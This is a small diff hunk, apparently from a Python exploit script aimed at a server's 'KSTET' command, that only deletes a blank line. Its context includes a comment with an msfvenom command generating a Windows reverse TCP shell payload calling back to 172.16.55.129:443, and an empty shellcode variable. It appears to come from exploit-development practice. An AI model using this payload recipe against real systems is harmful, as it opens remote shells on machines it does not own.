@@ -933,7 +933,6 @@ import time
 # Vulnerable command
 command = "KSTET "
 
-
 # msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=172.16.55.129 LPORT=443 -f python -v shell
 # 324 bytes
 shell =  ""
